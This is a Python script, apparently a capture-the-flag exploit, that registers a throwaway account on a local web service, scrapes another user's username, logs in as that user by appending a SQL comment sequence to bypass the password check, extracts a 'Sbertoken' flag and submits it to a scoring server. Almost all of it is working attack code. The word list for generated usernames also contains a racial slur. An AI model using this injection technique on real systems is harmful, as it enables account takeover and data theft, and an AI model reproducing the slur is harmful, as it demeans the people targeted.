import requests
from bs4 import BeautifulSoup
import random
session = requests.Session()
import re
adjectives = ["swift", "brave", "clever", "silent", "golden"]
nouns = ["eagle", "shadow", "river", "nigger", "mountain", "star"]
special_chars = ["_", "-", "."]

def generate_random_username():
    adj = random.choice(adjectives)
    nou = random.choice(nouns)
    num = random.randint(100, 9999)
    char = random.choice(special_chars)
    return f"{adj}{char}{nou}{num}"



url = "http://192.168.5.111:1015"

test_get = session.get(url+'/sign_up')


login1 = generate_random_username()
password = '123'

print(f"login: {login1} \npassword: {password}")


register_data = {
    "username" : login1,
    "password" : password
}

post_register = session.post(url+"/register", data=register_data)

if post_register.status_code == 200:
    print("LESSGOOO")
else:
    print("Suka")
    print(post_register.status_code)

post_profiles = session.get(url+"/sus_browser")
sus_soup = BeautifulSoup(post_profiles.text, 'html.parser')
sus_id = sus_soup.find_all('div', id=re.compile(r'^sus'))
id = ""
for elem in sus_id:
    id = elem.get('id')[3:]
    break

post_profile_info = session.get(url+"/sus/"+str(id))
profile_30_html = post_profile_info.text

soup = BeautifulSoup(profile_30_html, 'html.parser')

parsing_data = soup.find_all('span', id= "AuthorUsername")
my_id = ""
for data in parsing_data:
    my_id = str(data).split()[-1][:-7]
   
my_id += "'-- "

injection_data = {
    "username" : my_id,
    "password" : password
}

post_with_id = session.post(url+'/authorize', data=injection_data)

result = post_with_id.text

print("Найден Sbertoken-> ", result.find("Sbertoken"))
soup2 = BeautifulSoup(result, 'html.parser')

flag = soup2.find_all('p', id="Sbertoken")
fflag = ""
for i in flag:
    fflag = i.get_text()
    break


resp = requests.get(f"http://192.168.5.113:8080/flag?teamid=t01&flag={fflag}")
print(resp.status_code)
print(resp.text)

#c01d7d83-d517-d4e4-8e72-034560364683
#c01dd1a3-9aa8-162e-0ded-6b0160365104